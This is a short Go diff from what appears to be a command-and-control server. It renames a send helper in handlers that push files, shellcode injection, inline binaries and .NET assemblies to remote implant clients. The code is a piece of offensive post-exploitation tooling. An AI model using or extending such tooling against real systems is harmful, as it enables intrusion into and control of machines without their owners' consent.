@@ -248,14 +248,14 @@ func FileUpload(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UploadStart))
 		byteToSend := append(cmdTypeBytes, cmd...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
+		sendcommand.SendCommandBytes(uid, byteToSend)
 
 		for _, filebytes := range fileBytesArray[1:] {
 			cmdLoop := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, filebytes)
 			cmdTypeBytesLoop := make([]byte, 4)
 			binary.BigEndian.PutUint32(cmdTypeBytesLoop, uint32(command.UploadLoop))
 			byteToSendLoop := append(cmdTypeBytesLoop, cmdLoop...)
-			sendcommand.SendFileUploadCommand(uid, byteToSendLoop)
+			sendcommand.SendCommandBytes(uid, byteToSendLoop)
 		}
 	}()
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
@@ -599,7 +599,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
+		sendcommand.SendCommandBytes(uid, byteToSend)
 	case "inline-bin":
 		var u database.Clients
 		database.Engine.Where("uid = ?", uid).Get(&u)
@@ -611,12 +611,12 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
 		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
+		sendcommand.SendCommandBytes(uid, byteToSend)
 	case "shellcode-inject":
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
 		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
+		sendcommand.SendCommandBytes(uid, byteToSend)
 	case "inline-execute":
 		fileLength := len(fileBytes)
 		fileLengthBytes := make([]byte, 4)
@@ -625,7 +625,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
+		sendcommand.SendCommandBytes(uid, byteToSend)
 	}
 
 }
